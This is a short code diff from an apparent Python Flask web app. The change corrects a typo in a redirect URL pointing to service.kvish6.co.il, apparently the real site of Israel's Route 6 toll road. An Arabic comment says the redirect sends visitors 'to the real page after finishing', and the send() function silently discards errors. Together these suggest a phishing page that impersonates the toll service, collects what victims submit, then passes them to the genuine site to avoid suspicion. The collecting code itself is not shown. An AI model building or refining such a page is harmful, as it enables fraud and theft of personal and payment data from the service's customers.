@@ -89,7 +89,7 @@ def send():
     except: pass
     
     # تحويل لصفحة حقيقية بعد الانتهاء
-    return redirect("https://www. service.kvish6.co.il")
+    return redirect("https://www.service.kvish6.co.il")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
